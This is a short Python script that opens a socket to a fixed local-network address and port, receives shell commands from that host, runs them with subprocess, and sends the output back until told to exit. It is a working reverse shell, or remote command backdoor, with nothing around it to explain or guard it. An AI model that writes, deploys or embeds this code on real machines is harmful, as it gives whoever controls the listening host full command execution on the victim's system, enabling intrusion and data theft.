import socket
import subprocess

sock = socket.socket()

host = "192.168.1.132"
port = 1500
sock.connect((host, port))

message = sock.recv(1024).decode()
print(message)

while True:
    command = sock.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    sock.send(output.encode())

sock.close()